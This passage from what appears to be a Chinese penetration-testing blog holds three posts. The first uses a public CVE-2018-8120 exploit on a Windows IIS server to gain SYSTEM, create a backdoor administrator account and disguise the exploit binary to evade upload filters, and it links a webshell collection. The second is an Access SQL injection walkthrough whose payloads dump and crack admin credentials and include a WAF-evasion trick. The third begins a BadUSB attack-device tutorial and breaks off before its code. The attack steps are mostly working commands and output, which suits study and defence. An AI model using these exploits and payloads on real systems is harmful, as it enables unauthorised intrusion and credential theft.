src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/341.png" alt="图片"></p><p>关键信息有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">操作系统是Windows 7 x64</span><br><span class="line"></span><br><span class="line">补丁只打了两个：KB2534111、KB976902</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么我们就可以上传<code>*.exe</code>本地溢出提权！</p><p>这边是在<code>Github</code>上找到了一个提权<code>exe</code>: <a href="https://github.com/alpha1ab/CVE-2018-8120">CVE-2018-8120</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-8120 Windows LPE exploit</span><br><span class="line"></span><br><span class="line">测试支持: Win7 x32, Win7 x64, Win2008 x32, Win2008 R2 x32, Win2008 R2 Datacenter x64, Win2008 Enterprise x64 WinXP x32, Win2003 x32,Win2003 x64</span><br><span class="line"></span><br><span class="line">原exp不支持xp，2003，当前代码在原基础上增加了对这两个系统的支持</span><br></pre></td></tr></table></figure><p>吧<code>exe</code>上传到<code>可读可写</code>的目录:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/342.png" alt="图片"></p><p>先是使用<code>exe</code>看了看当前权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[*] 磁盘列表 [ C:D: ]</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; whoami</span><br><span class="line">iis apppool\bjgs_v2.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; </span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; CVE-2018-8120.exe &quot;whoami&quot;</span><br><span class="line">CVE-2018-8120 exploit Change by @Topsec_Alpha_lab(https://github.com/alphalab)</span><br><span class="line">[-] Could not load ntkrnlmp.exe , load ntoskrnl.exe instead.</span><br><span class="line">[+] Trying to execute whoami as SYSTEM...</span><br><span class="line">[+] Process created with pid 3132!</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/343.png" alt="图片"></p><p>是一个：<code>nt authority\system</code>系统权限！</p><p>提权命令：（创建一个<code>hack</code>用户并且提升为<code>管理员组</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-8120.exe &quot;net user hack hack /add&quot;</span><br><span class="line"></span><br><span class="line">CVE-2018-8120.exe &quot;net localgroup administrators hack /add&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/344.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; net user</span><br><span class="line"></span><br><span class="line">\\ 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    hack                     </span><br><span class="line">liuwx                    </span><br><span class="line">命令运行完毕，但发生一个或多个错误。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; net user hack</span><br><span class="line">用户名                 hack</span><br><span class="line">全名                   </span><br><span class="line">注释                   </span><br><span class="line">用户的注释             </span><br><span class="line">国家/地区代码          000 (系统默认值)</span><br><span class="line">帐户启用               Yes</span><br><span class="line">帐户到期               从不</span><br><span class="line"></span><br><span class="line">上次设置密码           2019/10/7 11:04:04</span><br><span class="line">密码到期               2019/11/18 11:04:04</span><br><span class="line">密码可更改             2019/10/7 11:04:04</span><br><span class="line">需要密码               Yes</span><br><span class="line">用户可以更改密码       Yes</span><br><span class="line"></span><br><span class="line">允许的工作站           All</span><br><span class="line">登录脚本               </span><br><span class="line">用户配置文件           </span><br><span class="line">主目录                 </span><br><span class="line">上次登录               从不</span><br><span class="line"></span><br><span class="line">可允许的登录小时数     All</span><br><span class="line"></span><br><span class="line">本地组成员             *Administrators       </span><br><span class="line">全局组成员             *None                 </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>提权成功！</p><h2 id="番外篇"><a href="#番外篇" class="headerlink" title="番外篇"></a>番外篇</h2><h4 id="二进制文件后缀可任意修改"><a href="#二进制文件后缀可任意修改" class="headerlink" title="二进制文件后缀可任意修改"></a>二进制文件后缀可任意修改</h4><p>首先我们是有一个二进制文件：<code>CVE-2018-8120.exe</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/374.png" alt="图片"></p><p>接着吧<code>exe</code>后缀改成<code>txt</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/375.png" alt="图片"></p><blockquote><p>CVE-2018-8120.txt “whoami”</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; CVE-2018-8120.txt &quot;whoami&quot;</span><br><span class="line">CVE-2018-8120 exploit Change by @Topsec_Alpha_lab(https://github.com/alphalab)</span><br><span class="line">[-] Could not load ntkrnlmp.exe , load ntoskrnl.exe instead.</span><br><span class="line">[+] Trying to execute whoami as SYSTEM...</span><br><span class="line">[+] Process created with pid 2700!</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/376.png" alt="图片"></p><p>可以看到，是可以执行的！</p><p>一般这种用于不能上传<code>exe</code>、<code>bat</code>文件，我们就可以吧<code>exe</code>文件修改为可上传的后缀文件也能照常运行！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/377.png" alt="图片"></p><p>图片格式也是可以的！</p><h4 id="aspx比asp权限大"><a href="#aspx比asp权限大" class="headerlink" title="aspx比asp权限大"></a>aspx比asp权限大</h4><p>如果网站支持<code>aspx</code>脚本，那么有的时候<code>asp</code>的权限比较小，但是上传了<code>aspx</code>脚本后权限就比<code>asp</code>要大一些！</p><p>因为<code>aspx</code>使用的是<code>.net</code>技术。IIS 中默认不支持，<code>ASPX</code>需要依赖于<code>.net framework</code> …ASP只是脚本语言而已。<code>ASP.NET</code>允许用户使用IIS建立网络服务。入侵的时候…<code>asp</code>的木马一般是<code>guest</code>权限…<code>APSX</code>的木马一般是<code>users</code>权限…<code>iis6 </code>默认以<code>network service</code>身份运行。<code>iis5</code>默认是<code>aspnet ASP.NET</code>,<code>IIS</code>的权限机制非常复杂，对每一层应用，都有不同的权限控制。总之..要求对<code>asp.net</code>开放相应权限，才可以让你的网站完成相应的服务。<code>ASP.net</code>程序的访问权限由<code>ASPNET</code>的权限来决定。<code>ASPNET</code>隶属于<code>Users</code>组。所以<code>ASPX</code>权限就要高一些…</p><h4 id="WebSHELL集合"><a href="#WebSHELL集合" class="headerlink" title="WebSHELL集合"></a>WebSHELL集合</h4><p><a href="https://github.com/tennc/webshell">This is a webshell</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> 红队攻防 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入学习之 - Access数据库注入原理</title>
      <link href="/2019/10/06/SQL-Access-1/"/>
      <url>/2019/10/06/SQL-Access-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=491577283&auto=1&height=66"></iframe><h2 id="Access-简介"><a href="#Access-简介" class="headerlink" title="Access-简介"></a>Access-简介</h2><p><code>Microsoft Office Access</code>是由微软发布的关系数据库管理系统。它结合了 <code>MicrosoftJet Database Engine</code> 和 图形用户界面两项特点，是 <code>Microsoft Office </code>的系统程序之一</p><p>一般<code>Access</code>数据库用于<code>asp</code>、<code>aspx</code>脚本网站比较多一些，这是一个比较小型的数据库，<code>Access</code>是以文件形式存放于目录中</p><p>有(列名/字段)、表名、值，数据库后缀是<code>*.mdb</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/334.png" alt="图片"></p><p>从上图可以知道：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">表名：admin_user</span><br><span class="line"></span><br><span class="line">列名/字段：admin</span><br><span class="line"></span><br><span class="line">值：21232f297a57a5a743894a0e4a801fc3</span><br></pre></td></tr></table></figure><h2 id="Asp连接Access数据库代码"><a href="#Asp连接Access数据库代码" class="headerlink" title="Asp连接Access数据库代码"></a>Asp连接Access数据库代码</h2><p><code>*.mdb</code>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">dim conn,connstr,db</span><br><span class="line">db=&quot;Your.mdb&quot; </span><br><span class="line">Set conn = Server.CreateObject(&quot;ADODB.Connection&quot;)</span><br><span class="line">connstr=&quot;Provider=Microsoft.Jet.OLEDB.4.0;Data Source=&quot; &amp; Server.MapPath(db)</span><br><span class="line">conn.Open connstr</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><code>*.accdb</code>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">dim conn,connstr,db</span><br><span class="line">db=&quot;Your.accdb&quot; </span><br><span class="line">Set conn = Server.CreateObject(&quot;ADODB.Connection&quot;)</span><br><span class="line">connstr=&quot;Provider=Microsoft.ACE.OLEDB.12.0;Data Source=&quot; &amp; Server.MapPath(db)</span><br><span class="line">conn.Open connstr</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="Access数据库注入原理"><a href="#Access数据库注入原理" class="headerlink" title="Access数据库注入原理"></a>Access数据库注入原理</h2><p>看一个网站有没有注入就是看看我们插入的字符有没有带入网站数据库中进行执行，执行就说明存在注入</p><p>漏洞靶场： <a href="http://127.0.0.1:99/">http://127.0.0.1:99/</a></p><p>在URL后面<code>*1</code>,也就是<code>id=31</code>乘1，结果还是等于31对吧</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/335.png" alt="图片"></p><p>所以页面返回正常！那么我在后面加一个<code>-7</code>: 因为数据库中只有id为：31、22、23、24、25、26的值：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/336.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/337.png" alt="图片"></p><p>可以看到在URL后面<code>-7</code>页面返回了是其他页面，说明它吧我们输入的值带入查询了！说明存在<code>SQL</code>注入</p><p>当然有些人判断是否存在注入是这样的：（当然你了解了原理，判断注入的方式都无所谓）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 返回正常</span><br><span class="line"></span><br><span class="line">and 1=2 返回错误</span><br><span class="line"></span><br><span class="line">存在上方条件即可判断存在SQL注入</span><br><span class="line"></span><br><span class="line">但是我一般喜欢用：.0 和 .1来判断（过安全狗）</span><br><span class="line"></span><br><span class="line">.0 返回正常</span><br><span class="line"></span><br><span class="line">.1 返回错误</span><br></pre></td></tr></table></figure><p>有的时候你插入一些语句，网站页面前台不会回显任何信息，可以使用<code>BurpSuite</code>来查看回显信息!</p><h3 id="判断数据库注入"><a href="#判断数据库注入" class="headerlink" title="判断数据库注入"></a>判断数据库注入</h3><p>为什么要判断是那种数据库？答：因为知道了数据库的类型就可以使用响应的SQL语法来进行注入攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断是否为access数据库</span><br><span class="line">and exsits(select * from msysobjects)&gt;0  </span><br><span class="line"></span><br><span class="line">判断是否为sqlserver数据库and exsits(select * from sysobjects)&gt;0</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">判断是否为access数据库</span><br><span class="line"></span><br><span class="line">and exsits(select * from msysobjects)&gt;0 </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/345.png" alt="图片"></p><p>可以看到页面回显：不能读取记录；在 <code>&#39;msysobjects&#39;</code> 上没有读取数据权限</p><p>说明存在<code>msysobjects</code>这个数据库名，<code>Access</code>数据库就存在这个数据库名！</p><h3 id="判断数据库表名"><a href="#判断数据库表名" class="headerlink" title="判断数据库表名"></a>判断数据库表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">联合查询是否有admin这个表名</span><br><span class="line">and exists(select * from amdin)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/346.png" alt="图片"></p><p>很显然，<code>admin</code>这个表不存在！</p><p>常见的表名有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admins</span><br><span class="line">admin_user</span><br><span class="line">admin_usr</span><br><span class="line">admin_msg</span><br><span class="line">admin_login</span><br><span class="line">user</span><br><span class="line">username</span><br><span class="line">manager</span><br><span class="line">msg_user</span><br><span class="line">msg_login</span><br><span class="line">useradmin</span><br><span class="line">...等等</span><br><span class="line"></span><br><span class="line">提示：一般Access数据库有个表名：news，不过没啥卵用</span><br></pre></td></tr></table></figure><p>最后手工猜解出表名是：<code>admin_user</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/347.png" alt="图片"></p><h3 id="判断数据库列名"><a href="#判断数据库列名" class="headerlink" title="判断数据库列名"></a>判断数据库列名</h3><p>刚刚手工猜解出表名是：<code>admin_user</code>,现在来根据表名来判断列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询admin_user表名下是否有admin这个列</span><br><span class="line"> and exists(select admin from admin_user)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/348.png" alt="图片"></p><p>说明<code>admin_user</code>表名下还是有<code>admin</code>这个列名的！</p><p><code>admin_user</code>表名下还有一个<code>id</code>列名一个<code>password</code>列名！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/349.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/350.png" alt="图片"></p><p>常见的列名有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin_user</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">pass</span><br><span class="line">pwd</span><br><span class="line">users</span><br><span class="line">usr</span><br><span class="line">user_login</span><br><span class="line">user_name</span><br><span class="line">login_name</span><br><span class="line">...等等</span><br></pre></td></tr></table></figure><h3 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">必须小于等于字段的长度返回正常</span><br><span class="line"></span><br><span class="line">order by [number]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 8</span><br><span class="line">返回错误</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/351.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 7</span><br><span class="line">返回正常</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/352.png" alt="图片"></p><p>知道了它有7列，那么就可以进行联合查询</p><h3 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过union联合查询admin_user这个表</span><br><span class="line">union select 1,2,3,4,5,6,7 from admin_user</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/353.png" alt="图片"></p><p>可以看到，网站页面回显了几个数字：2、3、5！</p><p>爆出来的数字是<code>非数字</code>类型的列,因为方便爆出来账号密码！因为账号密码不是数字类型的，是字符型的！</p><p>这样我们就可以在这些列上来爆账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用union联合查询admin_user表下的admin、password列的字段内容</span><br><span class="line">union select 1,admin,password,4,5,6,7 from admin_user</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/354.png" alt="图片"></p><p>得到用户名：admin</p><p><code>MD5</code>加密后的密码：21232f297a57a5a743894a0e4a801fc3 </p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/355.png" alt="图片"></p><p><code>MD5</code>解密结果为：<code>admin</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/356.png" alt="图片"></p><p>知道账号密码直接登录到后台管理！</p><h2 id="番外篇"><a href="#番外篇" class="headerlink" title="番外篇"></a>番外篇</h2><p>通过<code>ASCII</code>码来判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">判断admin_user表名下的admin列下的内容长度是否等于5个字符，返回正常说明长度就是5</span><br><span class="line"></span><br><span class="line">and (select len(admin) from admin_user)=5</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/357.png" alt="图片"></p><p>说明判断<code>admin</code>列名的长度是<code>5</code>!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">判断admin_user表名下的password列下的内容长度是否等于32个字符，返回正常说明长度就是32</span><br><span class="line"></span><br><span class="line">and (select len(password) from admin_user)=32</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/358.png" alt="图片"></p><p>一般<code>MD5</code>加密后的无非就<code>16</code>和<code>32</code>位字符！</p><p>现在是判断出来管理员账号和密码的字符长度了！</p><p>接下来猜解出每一个字符了！</p><h4 id="ASCII码的对照图"><a href="#ASCII码的对照图" class="headerlink" title="ASCII码的对照图"></a>ASCII码的对照图</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/359.png" alt="图片"></p><h3 id="ASCII码猜解字符"><a href="#ASCII码猜解字符" class="headerlink" title="ASCII码猜解字符"></a>ASCII码猜解字符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个语句的意思就是：</span><br><span class="line"></span><br><span class="line">查询admin_user表下的admin列名的第个字符的第一列的ascii码是否大于100</span><br><span class="line"></span><br><span class="line">and (select top 1 asc (mid(admin,1,1)) from admin_user)&gt;100</span><br></pre></td></tr></table></figure><p>因为<code>admin</code>列名的字段内容是<code>admin</code>!即第一个字符是<code>a</code>,而<code>a</code>的<code>ASCII</code>码是<code>97</code>!</p><p>那么就可以构造以下语句查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询admin列名字段内容的第一个字符的第一列的ASCII码是否等于97，也就是a</span><br><span class="line">and (select top 1 asc (mid(admin,1,1)) from admin_user)=97</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/360.png" alt="图片"></p><p>返回正常！说明第一个字符是<code>a</code>!</p><p>因为我们知道字段内容是<code>admin</code>,那么<code>a</code>的下一个字符就是是<code>d</code>，而<code>d</code>的<code>ASCII</code>码就是<code>100</code>:</p><p>那么就可以构造以下语句查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc (mid(admin,2,1)) from admin_user)=100</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/361.png" alt="图片"></p><p>返回正常！说明第二个字符的内容是<code>d</code>!</p><p>就是这样，一点点的判断然后爆出管理员的账号!也就是admin列名下的字段内容！</p><p>下面是爆<code>password</code>字段的内容：</p><p>因为之前我们知道了<code>password</code>的字段内容是：<code>21232f297a57a5a743894a0e4a801fc3</code>！</p><p>那么第一个字段内容就是<code>2</code>,下一个就是<code>1</code>,再下两个分别是<code>2</code>、<code>3</code>以此类推！</p><p>因为<code>2</code>的ASCII码是<code>50</code>，那么就构造语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc (mid(password,1,1)) from admin_user)=50</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/362.png" alt="图片"></p><p>返回正常！原理就是这样，以此类推下去慢慢猜解出来就好了，<code>sqlmap</code>就是采用这种方式来猜解字段内容的！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Access </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>U盘攻击：无视防火墙-3秒黑掉你的电脑|BadUSB-制作教程</title>
      <link href="/2019/09/29/BadUSB/"/>
      <url>/2019/09/29/BadUSB/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=552194857&auto=1&height=66"></iframe><h2 id="BadUSB简介"><a href="#BadUSB简介" class="headerlink" title="BadUSB简介"></a>BadUSB简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/103.jpg" alt="图片"></p><p>吾旧友，拾U盘,彼异之，插PC，遂上线。 这个愚蠢精彩故事不禁让我萌生学习制作一个BadUSB的想法，为了贴合实际，特地从某宝入手了一个BadUSB板，如下图所示。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/102.jpg" alt="图片"></p><blockquote><p>简单来说，通过硬件直接插入对方电脑，让对方电脑执行代码，达到控制主机或者窃取信息等目的(需要自行发挥想象)</p></blockquote><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一个BadUSB_Rubber_Ducky(橡皮鸭)</span><br><span class="line"></span><br><span class="line">Arduino的IDE - 下载地址：(https://www.arduino.cc/en/Main/Software)</span><br><span class="line"></span><br><span class="line">DPinst64驱动(根据电脑型号来,普遍都是64位操作系统)</span><br></pre></td></tr></table></figure><h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><p><code>Arduino</code>的安装就不讲了，傻瓜式安装:安装包 - 下一步 - 完成！</p><p><code>DPinst64</code>驱动安装的时候要选择<code>始终信任来自Digistump LLC</code> - 安装 - 下一步 - 完成！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/294.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/295.png" alt="图片"></p><h2 id="Arduino环境配置"><a href="#Arduino环境配置" class="headerlink" title="Arduino环境配置"></a>Arduino环境配置</h2><p>首先打开<code>Arduino</code> - <code>文件</code> - <code>首选项</code> - <code>附加开发板管理器网址</code>:</p><blockquote><p><a href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/296.png" alt="图片"></p><p>在<code>工具</code> - <code>开发板管理器</code> - 先等待它下载完文件:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/297.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/298.png" alt="图片"></p><p>接着在<code>类型</code>下拉菜单里有一个<code>贡献</code>然后选择<code>Digistump_AVR</code>安装完毕就Ok</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/299.png" alt="图片"></p><p>最后选择开发板对应的<code>开发板型号</code>和<code>编程器</code>然后选择<code>Keyboard</code>一个模板：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/300.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/301.png" alt="图片"></p><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>这是它示例的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> 